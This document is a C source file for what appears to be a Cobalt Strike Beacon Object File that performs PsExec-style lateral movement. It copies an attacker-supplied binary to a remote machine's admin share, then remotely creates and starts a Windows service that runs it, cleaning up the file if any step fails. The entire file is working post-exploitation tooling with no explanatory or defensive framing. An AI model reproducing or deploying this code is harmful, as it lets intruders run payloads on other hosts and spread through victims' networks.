#include <windows.h>
#include <stdio.h>
#include "beacon.h"

WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA( LPCSTR lpFileName );
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword);
WINADVAPI WINBOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
WINADVAPI WINBOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR *lpServiceArgVectors);

void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);

    ULONG tmp = 0;
    ULONG svcBinarySize = 0;
    CHAR* target      = BeaconDataExtract(&parser, NULL);
    CHAR* svcBinary   = BeaconDataExtract(&parser, &svcBinarySize);
    CHAR* binaryName  = BeaconDataExtract(&parser, &tmp);
    CHAR* share       = BeaconDataExtract(&parser, &tmp);
    CHAR* servicePath = BeaconDataExtract(&parser, &tmp);
    CHAR* serviceName = BeaconDataExtract(&parser, &tmp);
    CHAR* displayName = BeaconDataExtract(&parser, &tmp);

    CHAR remotePath[MAX_PATH];
    MSVCRT$_snprintf(remotePath, sizeof(remotePath), "\\\\%s\\%s\\%s", target, share, binaryName);

    HANDLE hFile = KERNEL32$CreateFileA(remotePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileA failed: %lu", KERNEL32$GetLastError());
        return;
    }

    DWORD bytesWritten;
    if (!KERNEL32$WriteFile(hFile, svcBinary, svcBinarySize, &bytesWritten, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteFile failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerA failed: %lu", KERNEL32$GetLastError());
        KERNEL32$DeleteFileA(remotePath);
        return;
    }

    char payloadPath[MAX_PATH];
    MSVCRT$_snprintf(payloadPath, sizeof(payloadPath), "%s\\%s", servicePath, binaryName);

    SC_HANDLE hSvc = ADVAPI32$CreateServiceA( hSCM, serviceName, displayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payloadPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "CreateServiceA failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$DeleteFileA(remotePath);
        return;
    }

    if (!ADVAPI32$StartServiceA(hSvc, 0, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "StartServiceA failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$DeleteFileA(remotePath);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Service '%s' [file '%s'] started", serviceName, payloadPath );
}